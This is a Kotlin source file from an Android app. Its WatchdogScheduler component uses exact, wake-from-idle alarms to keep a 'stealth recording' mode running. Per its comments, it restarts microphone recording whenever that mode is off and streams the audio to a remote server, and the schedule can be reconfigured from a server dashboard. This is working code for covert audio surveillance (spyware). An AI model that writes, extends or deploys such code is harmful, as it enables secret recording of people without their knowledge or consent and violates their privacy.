package com.audiostream.client

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import java.util.Calendar

/**
 * WatchdogScheduler.kt — Dynamic Recurring Stealth Watchdog
 *
 * Enforces periodic stealth mode verification with customizable anchor time
 * (default: 5:00 AM) and customizable interval (default: 2 hours).
 *
 * Configurable dynamically from the server / stealth dashboard:
 * - PREF_ANCHOR_HOUR (default: 5)
 * - PREF_ANCHOR_MINUTE (default: 0)
 * - PREF_INTERVAL_HOURS (default: 2)
 *
 * When the alarm fires, if stealth recording is OFF, it automatically starts
 * recording and streams audio chunks to the server.
 */
object WatchdogScheduler {

    private const val TAG = "WatchdogScheduler"
    const val ACTION_WATCHDOG_CHECK = "com.audiostream.client.ACTION_WATCHDOG_CHECK"
    const val REQUEST_CODE_WATCHDOG = 5001

    const val PREF_ANCHOR_HOUR = "watchdog_anchor_hour"
    const val PREF_ANCHOR_MINUTE = "watchdog_anchor_minute"
    const val PREF_INTERVAL_HOURS = "watchdog_interval_hours"

    const val DEFAULT_ANCHOR_HOUR = 5
    const val DEFAULT_ANCHOR_MINUTE = 0
    const val DEFAULT_INTERVAL_HOURS = 2

    /**
     * Update schedule settings dynamically from dashboard / server command
     */
    fun updateSchedule(context: Context, anchorHour: Int, anchorMinute: Int, intervalHours: Int) {
        val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val validInterval = intervalHours.coerceIn(1, 24)
        val validHour = anchorHour.coerceIn(0, 23)
        val validMin = anchorMinute.coerceIn(0, 59)

        prefs.edit()
            .putInt(PREF_ANCHOR_HOUR, validHour)
            .putInt(PREF_ANCHOR_MINUTE, validMin)
            .putInt(PREF_INTERVAL_HOURS, validInterval)
            .apply()

        Log.i(TAG, "⏰ Dynamic watchdog schedule updated: Anchor $validHour:$validMin, Interval: ${validInterval}h")
        scheduleRecurringWatchdog(context)
    }

    /**
     * Calculates the next watchdog trigger time based on dynamic settings.
     */
    fun getNextWatchdogTriggerTime(context: Context): Long {
        val prefs = context.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val anchorHour = prefs.getInt(PREF_ANCHOR_HOUR, DEFAULT_ANCHOR_HOUR)
        val anchorMinute = prefs.getInt(PREF_ANCHOR_MINUTE, DEFAULT_ANCHOR_MINUTE)
        val intervalHours = prefs.getInt(PREF_INTERVAL_HOURS, DEFAULT_INTERVAL_HOURS).coerceIn(1, 24)

        val now = Calendar.getInstance()
        val nowMs = now.timeInMillis

        // Start from today's anchor time
        val target = Calendar.getInstance().apply {
            set(Calendar.HOUR_OF_DAY, anchorHour)
            set(Calendar.MINUTE, anchorMinute)
            set(Calendar.SECOND, 0)
            set(Calendar.MILLISECOND, 0)
        }

        if (target.timeInMillis > nowMs) {
            // Anchor time is still in the future today
            return target.timeInMillis
        }

        // Anchor time has passed today -> advance by intervalHours until it is in the future
        while (target.timeInMillis <= nowMs) {
            target.add(Calendar.HOUR_OF_DAY, intervalHours)
        }

        return target.timeInMillis
    }

    /**
     * Schedules the next exact watchdog wakeup.
     */
    fun scheduleRecurringWatchdog(context: Context) {
        val appContext = context.applicationContext
        val alarmManager = appContext.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return

        val prefs = appContext.getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com")
            ?: "https://audio-steam-server.onrender.com"

        val intent = Intent(appContext, AlarmReceiver::class.java).apply {
            action = ACTION_WATCHDOG_CHECK
            putExtra(AlarmReceiver.EXTRA_ACTION, ACTION_WATCHDOG_CHECK)
            putExtra(AlarmReceiver.EXTRA_SERVER_URL, serverUrl)
        }

        val pendingIntent = PendingIntent.getBroadcast(
            appContext,
            REQUEST_CODE_WATCHDOG,
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val nextTriggerMs = getNextWatchdogTriggerTime(appContext)
        val triggerDate = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date(nextTriggerMs))

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setExactAndAllowWhileIdle(
                    AlarmManager.RTC_WAKEUP,
                    nextTriggerMs,
                    pendingIntent
                )
            } else {
                alarmManager.setExact(
                    AlarmManager.RTC_WAKEUP,
                    nextTriggerMs,
                    pendingIntent
                )
            }
            Log.i(TAG, "⏰ Next Dynamic Stealth Watchdog scheduled for: $triggerDate")
        } catch (e: Exception) {
            Log.e(TAG, "Failed scheduling watchdog alarm: ${e.message}")
        }
    }
}
